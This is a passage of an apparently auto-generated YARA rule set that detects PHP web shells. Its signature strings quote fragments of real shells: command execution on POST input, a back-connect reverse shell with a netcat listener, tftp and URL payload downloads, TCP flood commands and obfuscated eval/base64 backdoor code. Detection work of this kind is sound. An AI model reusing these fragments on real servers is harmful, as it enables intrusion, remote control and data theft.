      $s1 = "<?php eval(strrev(';))\"==wOp0lIwIyWUV0RfRCKtVGdzl3c\"(edoced_46esab(lave')); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_52a24d47b2ef5b2e6b3fbc1256cd665b285cdfcb
{
   meta:
      description = "php17 - file 52a24d47b2ef5b2e6b3fbc1256cd665b285cdfcb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e63f87c1811cfc8727bf6e2a3e8735110105c8b7dbe8475866d0edbca5ec2843"
   strings:
      $x1 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s2 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s3 = "<title>Small Web Shell By Zaco - Edited By KingDefacer</title>" fullword ascii
      $s4 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s5 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\".gz\\n\\n\");" fullword ascii
      $s6 = "# For alturks.com friends usage                                   #" fullword ascii
      $s7 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s8 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s9 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s10 = "# All bugs -> mailo:kingdefacer@msn.com                           #" fullword ascii
      $s11 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s12 = "<input name='action' value='download' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s13 = "<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>" fullword ascii
      $s14 = "$dump_file.=($rows2[$k]==''?'null);':'\\''.addslashes($rows2[$k]).'\\');').\"\\n\";" fullword ascii
      $s15 = "# Small PHP Web Shell By ZaCo Edited By KingDefacer (c) 2004-2010 #" fullword ascii
      $s16 = "$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s17 = "<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>" fullword ascii
      $s18 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s19 = "if(!@copy($_FILES[\"filename\"][\"tmp_name\"], $work_dir.$f)) echo('Upload is failed');" fullword ascii
      $s20 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule php17_1337
{
   meta:
      description = "php17 - file 1337.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e9fbfdbb0f02752c9b01af39c3f5322a1319bfe4308c71b6045c5531d47c4a3"
   strings:
      $x1 = "<?php ${\"\\x47L\\x4f\\x42\\x41\\x4c\\x53\"}[\"y\\x74\\x71\\x73i\\x64\\x62uw\\x62\"]=\"us\";${\"\\x47L\\x4fB\\x41LS\"}[\"f\\x79g" ascii
      $x2 = "shell_exec($_POST[\"c\\x63mmd\\x64\\x32\"]);echo\"\\t\\t\\t\\t\\t\\x3c/t\\x65x\\x74\\x61\\x72\\x65a>\";}echo\"\\t\\t\\n\\t\\t\\x" ascii
      $s3 = "s\\x74y\\x6c\\x65\\x3d\\\"\\x77i\\x64th: \\x37\\x34\\x35\\x70x; \\x68\\x65\\x69\\x67ht:\\x2020\\x34p\\x78\\x22>\";exec($_POST[\"" ascii
      $s4 = "ry\\x73\";$sql->host=$_POST[\"db\\x5f\\x73\\x65\\x72v\\x65r\"];$sql->port=$_POST[\"\\x64\\x62_p\\x6f\\x72t\"];$sql->user=$_POST[" ascii
      $s5 = "1L\\x53\"}[\"u\\x6f\\x71\\x67\\x70\\x6e\\x78o\\x62i\\x71\\x68\"]}.\"`\")!=1)return 0;if(!$this->get_result())return 0;$this->dum" ascii
      $s6 = "shell_exec($_POST[\"c\\x63mmd\\x64\\x32\"]);echo\"\\t\\t\\t\\t\\t\\x3c/t\\x65x\\x74\\x61\\x72\\x65a>\";}echo\"\\t\\t\\n\\t\\t\\x" ascii
      $s7 = "5r\\x72\\x6f\\x72\";if(@ociexecute($this->res)){if(@ocirowcount($this->res)!=0)return 2;return 1;}${${\"\\x47\\x4c\\x4f\\x42\\x4" ascii
      $s8 = "tion=@mysql_connect($this->host.\":\".$this->port,$this->user,$this->pass);if(is_resource($this->connection))return 1;$this->err" ascii
      $s9 = "[0][\"\\x43\\x72\\x65at\\x65 \\x54a\\x62l\\x65\"].\";\";$this->dump[]=\"#\\x23 ---------------------------------------\\x20\";if" ascii
      $s10 = "x72\\x65\\x61te\\x64: \".date(\"\\x64/m/Y \\x48:i:s\");${\"GL\\x4fB\\x41LS\"}[\"\\x73a\\x63\\x6e\\x62io\\x78\\x64xu\"]=\"t\\x61b" ascii
      $s11 = "ment($this->res);if($this->num_rows){$this->columns=@array_keys($this->rows[0]);return 1;}break;}return 0;}function dump($table)" ascii
      $s12 = "79\\x53Q\\x4c\\x20dump\";if($this->query(\"/*\".chr(0).\"*/\\x20\\x53H\\x4fW CR\\x45\\x41\\x54\\x45\\x20T\\x41B\\x4cE\\x20\\x60" ascii
      $s13 = "\\x68t:\\x201\\x32\\x70\\x78;\\x20\\x70\\x61d\\x64\\x69\\x6e\\x67:\\x20\\x35\\x70\\x78\\x3b}\\n\\x3c/\\x73tyl\\x65\\x3e\\n\\n\\x" ascii
      $s14 = "\\x74y\\x70e: \".${$frqcdbegrd});header(\"Co\\x6eten\\x74-\\x64is\\x70\\x6f\\x73i\\x74\\x69\\x6f\\x6e:\\x20a\\x74tac\\x68ment\\x" ascii
      $s15 = "\\x20 \\x20 #m\\x61in\\x20\\x61:\\x68\\x6f\\x76\\x65\\x72{co\\x6co\\x72:\\x20\\x23\\x300F\\x46\\x300; t\\x65xt-\\x64\\x65\\x63or" ascii
      $s16 = "n\\x72d\"]}=\"\\x68o\\x73t='\".$this->host.\"'\\x20p\\x6fr\\x74\\x3d\\x27\".$this->port.\"' use\\x72=\\x27\".$this->user.\"\\x27" ascii
      $s17 = "_exists(\"m\\x73sq\\x6c_c\\x6f\\x6e\\x6e\\x65c\\x74\"))return 0;$this->connection=@mssql_connect($this->host.\",\".$this->port,$" ascii
      $s18 = "\\x4c\\x4fB\\x41\\x4c\\x53\"}[\"\\x78m\\x63h\\x78\\x77\\x73\\x70r\"]});}$this->dump[]=\"\\x49\\x4e\\x53\\x45R\\x54 I\\x4eTO\\x20" ascii
      $s19 = "3]=\"\\x23\\x23 \\x44ata\\x62as\\x65: \".$this->base;$bkcngykc=\"i\";$this->dump[4]=\"\\x23\\x23 \\x20  T\\x61b\\x6c\\x65:\\x20" ascii
      $s20 = "rray();$this->dump[0]=\"\\x23#\";$this->dump[1]=\"#\\x23\\x20---------------------------------------\\x20\";$this->dump[2]=\"\\x" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_6579acda2aa3300fea73af0af78c9f0220445df3
{
   meta:
      description = "php17 - file 6579acda2aa3300fea73af0af78c9f0220445df3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b549ca661270a21cd6075877c0ec1ad9ad5d23411a05a7cbda6b44f04d25cbad"
   strings:
      $s1 = "WXJzUVlNa3IzSnVoS2diWUFNR3FZTWtyM0p1cUYwR3IzSnVJM1Bqclpmb3cyaU9QMWZ4UHVIR1B1cmdxWUptVVhxYXZIMGhxWU1HcVlKbVVYcUdlZFNtVVhQeXJEQ0hw" ascii
      $s2 = "MkMwSTJienBzSmpwc0ptaFlKMXJESGdxRmNIVkZNSFZGTWF2SDBocVlNR3FZSm1VWHFHZWRTbVVYUHlyRENIcFp0bkxkR3NDY3F4TFpDMHdXamdpRHQwTGRNOXFZcmdx" ascii
      $s3 = "WnRuTGRHc0laNHNRWU1zUHVIR1BYYjByQWs3Rk5PR3FZTUdQWGIwckFNOXFYYjByajl1TElTZ3dXYmpoWXJQUHVIR1B1cmdxWUptVVhxYXZIMGhxWU1HcVlKbVVYcUdl" ascii
      $s4 = "RFVwUDNQb1VaQ1ZUSWIwZFc1RHB1VVVXdVV1d0lKaktaam1VWVVVV3VKYUlDZ3N3SUNuVVpqenBqYkJVZFVVdkgwaHFZTUdxWU1HcVlNa3JzUHVXdUphcVlnR1ZDMEdl" ascii
      $s5 = "SVBtcVp0bXFZSkJMSWthcVhnYllBTUdxWU1HcVlNR3FZTUdxWUpsUUs1N1BabGpFSTBHZWRTREkyYW1wMjV5dzI5eFVEQ3VVdDlqcERiekxaanhMdUdrcGQwK0V1SkJM" ascii
      $s6 = "Tk9HcVlNR3FZTUdxWFBqVVhDdXBBU2x3ajlucDI1MkxJUDBJMkN4dzI5a1RXNXNoWUpsUVlNa1VaOGdxWUpEckQ5bGhLZ2JZQU1HcVlTbndJYmpxWVV6d0RhanczTnN2" ascii
      $s7 = "RzBocVlNR3FZTUdxWU1rVUR0dXJ1TTlxWnR1ckR0NUkybGpFSVZPTDJDMEkyOUFURENuVXQ5MndJUG1oWUpsaGRrN0ZOT0dxWU1HcVlNR3FaTHpyRENvdzJHR2hZSjJ3" ascii
      $s8 = "WHVtT0tCTEZ0RFZrZU1HWk5USXZIaGdxcHNVU0VqWVJ4d2RsUVBvYldhcm1yWU1Bc3VQeUl4RHZoU1F0bEZDa0VWWkxiS3F6WG9HUmFnaWRjbndKZkhVak5lT3BXVEJl" ascii
      $s9 = "RHQ1aFlrN0ZOT0dxWU1HTEQ5dXFZR2tUZE05cUZNN3FZSmFxRkhHUFo0N3FZSmFodWdhcVhnYllBTUdxWU1HcVlNR1BYUHV3Q2drVGRNQnFGdFVxRjBHUFphbVVYUGFw" ascii
      $s10 = "ZHJncVlKbVVYcWF2SDBocVlNR3FZSlJyM0p1VFc1c3FGMEdMajlScjI5eEkySmp3MjlrTGRHa3IzSnVRWVMwcnNDamhLZ2JZQU1HcVlNa3BBTTlxWmJ6VVc1MGhZSlJy" ascii
      $s11 = "M0p1VFc1c1d1VXV3SUpqS1pqbVVjanhMRDhzSUNnc3JEdDBMaWZhcjNOc0lkazdGTk9HcVlNR1BYUHV3ZE05cVp0dXJEdDVoWWs3Rk5PR3FZTUdQWFB1ckFNOXFadHVy" ascii
      $s12 = "WVNud0lianFZVUFwMjlnTFd0eFBtT2JZQU1HcVlNR3FZTUdGTk9HcVlNR3cydG1MZE1zTERmendJTnN2RzBocVlNR3FZTUdxWU1iWUFNR3FZU253SWJqcVlVa3AzQ0Fw" ascii
      $s13 = "Mjl4VVpDeFVGMGZQRGIxcnNQanBzSk53V1VqZUtjRFRJYmxwM1BqZUtNRHIyajBMaWpjZWRMMGVJZ2tyMmowTGlqY3lkcTdGTk9HcVlNR1BYYjByQU05cVpMYXBaQ3lM" ascii
      $s14 = "ZE1rVHNiMHJEanhMMWdzckR0MExpZmFyM0pQcERMelAxMXBQM1BvVVpDVlRJYjBQMTFwUFpqVVd1VXV3SUpqTjI5eFVaQ3hVWVVVdkgwaHFZTUdxWU1HcVlNa3Jzd0dl" ascii
      $s15 = "WGIwckFNOXFZSkFwMko1dkgwaHFZTUdxWFNvcnNiakkzYjByQUdrcjNKdWhLZ2JZQU1HcVlNa1VJUGdxRjBHcURvMFVYTTZRdTl1d0lKalFzSm9wMlBvcHU1bnAyMHpM" ascii
      $s16 = "SWo5UVlNa0xzUHpwZEhHUFhKemhLZ2JZQU1HcVlNR3FZTUd5TjBocVlNR3FZTUdxWVN1TElKMXJENEdQWjA3Rk5PR3FZTUd3MnRtTGRNc3dJUHV3SWtzdkcwaHFZTUdx" ascii
      $s17 = "WmlzdkcwaHFZTUdxWU1HcVlNYllBTUdxWVNud0lianFZVXZDaWZWUG1PYllBTUdxWU1HcVlNR3JEQzBVSVB4cVlKbHZIMGhxWU1HcVpib3IyaUdQM2IwckRqeEx1cjZG" ascii
      $s18 = "WU1rVVo4YUZOYTdGTk9HcVlNR3IzVWFVWmJPcVlvc0xJSjBFSVNqaFlKbGhka0dFSDBocVlNR3FaYm9yMmlHUDJqeFVaQ3NMSXFzdkcwaHFZTUdxWU1HcVlNYllBTUdx" ascii
      $s19 = "QU1HcVlNR2hBOGJZQThSaEFPUmhBT1JoQU9SaEFPUmhBT1JoQU9SaEFPekZOYURVVzVuVVpqenBBU2lVSVB4aUR0MExDSm9MdUdEUFpQekxYa2FGTmE3Rk5PR3FZTUdQ" ascii
      $s20 = "WU1HcVlNR3FZU3VMSUoxckQ0R1BaMDdGTk9HcVlNR0xaQ0R3SUNnVUZPYllBTUdxWU1HcVlNR0ZOT0dxWU1HeU4waHFZTUdxWFBqVVhDdXBBTWtwS2diWXMwPSI7ZXZh" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule a7b3b8a66367f3e61183f78bbb82556eb2c2e40b
{
   meta:
      description = "php17 - file a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $x1 = "echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[6] = \"tftp -i 123.234.222.1 get silic.exe c:\\\\silic.exe\";" fullword ascii
      $x4 = "Str[8] = \"tftp -i 123.234.222.1 get a.exe c:\\\\\\\\a.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\boot.ini d:\\a.txt';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $s17 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
      $s18 = "echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $s19 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://blackbap.org/a.exe';" fullword ascii
      $s20 = "$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule sig_49b2cc8deeca1aac550e05b1c43882d80ef3c2e6
{
   meta:
      description = "php17 - file 49b2cc8deeca1aac550e05b1c43882d80ef3c2e6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b5bf58f12c908bc9a428f8a51b2f9b28b0d1ba59c7ffc86a2d88b714f3bb4c09"
   strings:
      $x1 = "\"cmd\" => \"cmd <command> - Execute shell commands\"," fullword ascii
      $x2 = "if (!$host or !$port or !$packet or !$hitung) { msg($sock,$to,\"Usage: \".comz(\"tcf\",1)); return; }" fullword ascii
      $x3 = "elseif (enabled(\"passthru\")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x4 = "elseif (enabled(\"system\")) { @ob_start(); system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x5 = "E-Tickets Each Empire Encryption Error Exec Execution Expression Extension Extract Fetch Fields" fullword ascii
      $s6 = "Pad Parent Parse Payflow [Pop] Pop3 Popen Pos PostgreSQL Pow Precision Prev Print Printer Process" fullword ascii
      $s7 = "if (TEZ) { $rez = httpquery2(\"http://localhost/search/busca.uol.com.br.htm\"); }" fullword ascii
      $s8 = "if (TEZ) { $rez = httpquery2(\"http://localhost/search/google.com.htm\"); }" fullword ascii
      $s9 = "if (TEZ) { $rez = httpquery(\"http://localhost/search/google.com.htm\",10); }" fullword ascii
      $s10 = "$astrourl = \"http://beta20.astaga.com/astrology/grup/\";" fullword ascii
      $s11 = "logz('',\"<TR><TD>$ADDR</TD><TD>$CMD</TD><TD>$ARG1</TD><TD>$ARG2</TD><TD COLSPAN=3>$TEXT</TD></TR><TR><TD COLSPAN=8>\");" fullword ascii
      $s12 = "\"tcf\" => \"tcpflood <host> <port> <packet> <hitungan> - Tcp Flood\"," fullword ascii
      $s13 = "\"svc\" => \"svc <service/port> - Get services/port information\"," fullword ascii
      $s14 = "$services = array('http', 'ftp', 'ssh', 'telnet', 'imap','smtp', 'nicname', 'gopher', 'finger', 'pop3', 'www');" fullword ascii
      $s15 = "Calendar Character Chdir Check Chroot Chunk [Class] ClibPDF [Close] Closedir Com Combine Command Comp" fullword ascii
      $s16 = "$ptn = '/ID: (.+?)<br>SAFE: (.*?)<br>OS:\\s+(.*?)<br>UNAME: (.*?)<br>SERVER: (.*?)<br>USER: (.*?)<br>UID: (.*?)<br>DIR: (.*?)<b" fullword ascii
      $s17 = "\"aut\" => \"auth <pass> - Login\"," fullword ascii
      $s18 = "elseif (enabled(\"shell_exec\")) { $rez = shell_exec($cmd); }" fullword ascii
      $s19 = "\"irc.plasa.com\", \"irc.indoforum.org\", \"irc.telkom.net.id\"," fullword ascii
      $s20 = "if ( empty($_SERVER[\"HTTP_HOST\"]) && empty($_SERVER[\"SERVER_ADDR\"]) ) { proz('!','SUPER GLOBAL VARIABLE IS EMPTY'); }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_4b6822dcc4d48a8d375b2287a9aefc5e5f884dd6
{
   meta:
      description = "php17 - file 4b6822dcc4d48a8d375b2287a9aefc5e5f884dd6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "658d728810a24ae6f3d81296c5e0f13b932984f84c9e7abc61657345150a43b0"
   strings:
      $s1 = "$l=system($b.$a[6]);" fullword ascii
   condition:
      uint16(0) == 0x89e5 and filesize < 1KB and
      all of them
}

rule sig_4f20006e4b49fda29593038f861c0caecf57853d
{
   meta:
      description = "php17 - file 4f20006e4b49fda29593038f861c0caecf57853d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e34a50ba2d428f26ae9847f1e013bedc430fdd2b706995e394aa5d975cba615"
   strings:
      $s1 = "$N='ay(\"/\",\"|Z+\")|Z,$ss($s[$i],0|Z|Z,$|Ze))),$k)));|Z$o=o|Zb_get_co|Zntent|Zs();ob_e|Znd|Z_clean();$d=b';" fullword ascii
      $s2 = "$I='a|Zse64_|Zenc|Zo|Zde(x(gzcomp|Zr|Zess($o),$|Zk|Z));print(|Z|Z\"<$k>$d|Z</$k>\")|Z;@sessi|Zon_destroy();}}}}';" fullword ascii
      $s3 = "$w='=$_S|ZERVER;|Z$rr|Z=@|Z$r[\"HTTP_REFERER\"|Z|Z];$ra=@$r[|Z\"HTTP_|Z|ZA|ZCCEPT_LANGUAGE\"];if|Z($rr&&|Z$ra|Z';" fullword ascii
      $s4 = "$e='y_key_|Zexist|Zs($i,$s)){$s|Z[$i].|Z=|Z$p;$e=str|Zp|Zos(|Z$s[$i],$f);if($e|Z){$k=$|Zkh.$|Zkf;o|Zb_start()';" fullword ascii
      $s5 = "$y='$kh|Z=\"5d|Z41\";$kf=\"4|Z02a\";f|Zunction x($|Zt,$k){$|Z|Zc|Z=strl|Zen($k);$l=strl|Zen($t)|Z;$o=\"\";f|Zor($i=|Z0;$i<';" fullword ascii
      $s6 = "$X=';$|Zs=&$_SESSI|ZON;$s|Zs=\"subst|Zr\";$sl|Z=\"|Zstrtolower\"|Z;|Z$i=$m[1][0|Z]|Z.$m|Z[1][1];$h=$sl($|Zss(m|Zd';" fullword ascii
      $s7 = "$Y=';@|Ze|Zval(@g|Zzunc|Zo|Zmpress(@x(@base6|Z4_decod|Z|Ze(preg_replac|Ze(|Zarray(\"/|Z_/\",|Z\"/-/\"),a|Z|Zrr';" fullword ascii
      $s8 = "$i='l(|Z\"/([\\\\w|Z])[\\\\w-|Z]+(|Z?:;q=0|Z.([\\\\d])|Z)?,|Z?/\"|Z,$ra|Z,$m);if($q&&$m|Z)|Z{@sess|Zion_st|Zart()';" fullword ascii
      $s9 = "$c='$l;|Z){for(|Z$j=|Z0;($j<|Z$c&&$i<|Z$l);$j+|Z+,|Z$i++){$o.|Z=$|Zt{$i|Z}^$|Zk{$j};}}return $o|Z;}|Z$r';" fullword ascii
      $s10 = "$a=')|Z{$u=p|Zarse|Z_url($rr);p|Zar|Zse_str($|Zu[\"query\"]|Z,$q|Z);$q=array_|Zvalues|Z($q);p|Zreg_m|Zatch_al';" fullword ascii
      $s11 = "$F='5($i.$k|Zh),0,3|Z));|Z|Z$f=$sl($s|Zs|Z(md5($i.$kf),0,|Z3));$p=|Z\"\";for|Z($z=1;$|Zz<|Z|Zcount($m[1]);|Z';" fullword ascii
      $s12 = "$r='$z++)$p.=|Z$q[$|Zm[2]|Z[$|Zz|Z]];if(strpos($p,|Z$h|Z)===0){$s[$i|Z]=|Z\"\";$p=$ss(|Z$p,|Z3)|Z;}|Zif(arra';" fullword ascii
      $s13 = "$W=str_replace('|Z','',$y.$c.$w.$a.$i.$X.$F.$r.$e.$Y.$N.$I);" fullword ascii
      $s14 = "$t=str_replace('pO','','pOcrpOeapOte_fupOpOpOnction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_37536ca259bedf0307d3f614b06f09dc153cac7b
{
   meta:
      description = "php17 - file 37536ca259bedf0307d3f614b06f09dc153cac7b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7970c597f37906b7fca35e822dc0dc777eb519d31a6afebbbc2d5680fba78c9f"
   strings:
      $x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}" ascii
      $s2 = "#solevisible@gmail.com" fullword ascii
      $s3 = "G/QGxJgggfQH9DUmpBTIBKN1M2TaFAVWldEABQTXWxoGleU05wVWo/NVM1awYEUGM1TXRAgOkAPm1WUmNqekB2UQQIUnA0SUJ8wH5zbFVBXUtATVVmAEBtRVVQamNzYk" ascii
      $s4 = "BAQSABalYFUFBAPkheNWNdUmpjMwoAAAJdUjRJclRrTURRQndUY8oAUEIQa5GQUmA2XUEAVTdzUROAcFZrQQMETGJsQW1TJIA+AH5Sbj5F0QBsVhQANzYzScFdswBWNT" ascii
      $s5 = "AAN0FSZn1sNVJRUWZdNzZBUAAAaUVRUEJVbF02UTNMNVVFXQEAbEE0TH1FdLRAbFJAQUFJX1EAAFJlN11DVEFRRFI0Y0llQmMAAEheN01PVW1GM1BBVn1VNVEgETJUfU" ascii
      $s6 = "9scVR9gABagGpRd1V9RU1MN1FoZUFNVAAISzRvaVVRUWpiQU4zJ0FRQmuEANZAb3VRayhAU0VMUVJocGNCPggETWNCVUbASUBmQl1AUlFPAGtJBIBvVFNON5bAQl6OIF" ascii
      $s7 = "fCwANAC8BTQUhWUlE3Y1BNThAiVWpzcUBdN1BqMzcBQE9WacEAbQQAUVddQlIMAE5+Y0BrbWM3TUtIglEFAEo3w0Bsf0i2gH5UbFFBF2BBoADqQDQLgEtdN2N9SUBjQl" ascii
      $s8 = "VOfUlQf0lVQe8Bd1Biak1BkAJCgVRBAIBDRWZKQVJ9Vl9vdwFTpSIOgDfVAEJVGgJjlwBjUEiQfklSm1BDAsBrcFNQc1WRgEI0QBwAYDJQQ0lsAAhmalZwZU93bEptUU" ascii
      $s9 = "NBSFJRRWlQUW8AAERKUE1yU2prTGJfY0lTT2sAYElVQkF3ZDddbNTAAgBjVGRqQQgETlJqa3nANkVIQmNMZjcLQGldAABvVjVJaVN9TjZmQFVfUGlBAABdZlBWcF1BY1" ascii
      $s10 = "JDSWMgPkvAgEtwQABAf0pBa09JQk1S/EBvVEJ3cF5AADTYQDU+X2ZSQUxjNT5xVn1FWABJc8BP+sDHAElWXlJdfmM3czVJIABQawgBMV1qb1ZKNU1fUG4/MoABRQBSSU" ascii
      $s11 = "VWfUFWTYBAAFFzFkBTgADFgEtefUFBSmtNaFNrRUFKQwAAb1JRT29IVEBJUVE3QUhibgAAPzZQQH9VVEJWfUlSf0RjNwIANldWUlV+eEA0VlNdMWJpTVZIAFMWAElpJo" ascii
      $s12 = "Y2VV5KX0FsSkNrvYBJaGUBkFBOcEhAPmo0AAQAY00VAHNlQjJYUEnCQDMHgKsANkJQaq8AahRBSWhQQCgETU56AFOjAFJda1Y2XWtF2QBJSoFA0gRBSzVWcFTaAEowwF" ascii
      $s13 = "NFZH1vQ2JpY0pVAABAczRWUj5VVX1Rc1NDb0RTAYFBbzFRbHdDIWCGQGNQVVFNckAAAIRuUFJJSVU0SUwAUV9IUFUwbHeYEMeAY0VfAGoASXZjN3NWNABrVVJdAMAzVE" ascii
      $s14 = "YzECBTQD7IgHNFXVNvROIAbVY3QW0AAEpANnNLfWtNVTUyTWZsb2gJAWNSd0KAgEtSEYBRUn90VF93SoAAAEFtXUAyTGRsb0tWbUlmZVICADZWSTZjSBgAX1ZRVjdQX0" ascii
      $s15 = "9eNGtoUTVJQAICEFBfVX5TAERLNkFRfwBVFABrUmtRAwJwYzZVc1QMAFwAXlNCY1Bm8oBjIFRDRd2Ad1FSUDJMBwAxDAJRG4FWMkATZL8AZUJdUmVBTXNQFgBkawUADA" ascii
      $s16 = "p/SGM1TVEDgElQUVJKaZvAzAEKAWxBbkprUn4AgV41f1BkNzZepABSSmp0f10SIEBAURQBa11TUTd3NYAAVFVRTU5QIoBsMoUAaHVeGQBQGAFrSVBlalVNQABdHgBdak" ascii
      $s17 = "o2d05JAQFrUn9jQwAATW5WUmNVUGxJS1ZQVVZSaiIAY2ziADFmNSFANlVmUlNdVmZqAQA2VWRfY2lJGoBUU0lpVEFCNAgiVmtWM44ARVBPd00JAHFdQDIBRQIEU159QU" ascii
      $s18 = "9VX1FBvABSGYBdUlJdXwIAVGpvbVRBZAB9bzJWbFFoVlIgGElVNAFVVD5RVm1VQw9AmuBRclMAAEFJbUs3dzJJQkEyXWledVVABFMEgE9jVWVPY0NlUlFNDQBBUQEFNl" ascii
      $s19 = "GToFZrAABRdlBrY2xKQGNAVlFSMmZswgIlAHMAZUJOcXAAaVZQVU9QagLAQAAAVUlSbF1QSlFvU1ZsQV5KaQKAY0NjN11RAQB0fgBsYzZ3RFBBIRBdRHLAX1BsUREAd2" ascii
      $s20 = "AMQFkAU1FCMgAAdFZRUXJlVD52UlFdRVFRQQBAMlJQf31dN1Y1DkBVVEI+XkkAgEFJQFY3QWpSwYBmakEyVlFNAIBzSEJNTlRPayFgPlRlUGB1XgKAUmA2UzRVrgFUDw" ascii
   condition:
      uint16(0) == 0x0a0a and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule sig_762b58d83c316dfb2311b21854cc1b8593200ccb
{
   meta:
      description = "php17 - file 762b58d83c316dfb2311b21854cc1b8593200ccb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "015da758596489bfa522767780ba331a26a77170a0eb89990986bc710de9cd6e"
   strings:
      $s1 = "register_tick_function ($e, $_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_AtLeast
{
   meta:
      description = "php17 - file AtLeast.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3732a06a74ae349d2b585f1c6204ad0b8d3272fe394557348bcefbbcb7dd014f"
   strings:
      $s1 = "* Copyright (c) 2010-2012, Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s2 = "* @author Brian Feaver <brian.feaver@gmail.com>" fullword ascii
      $s3 = "* @copyright  2010 Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s4 = "* @author     Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s5 = "* @link       http://www.digitalsandwich.com/" fullword ascii
      $s6 = "* Verifier mode that checks that the number of matched items are equal to or greater than the expected amount." fullword ascii
      $s7 = "*  *  Redistributions in binary form must reproduce the above copyright" fullword ascii
      $s8 = "* Phake - Mocking Framework" fullword ascii
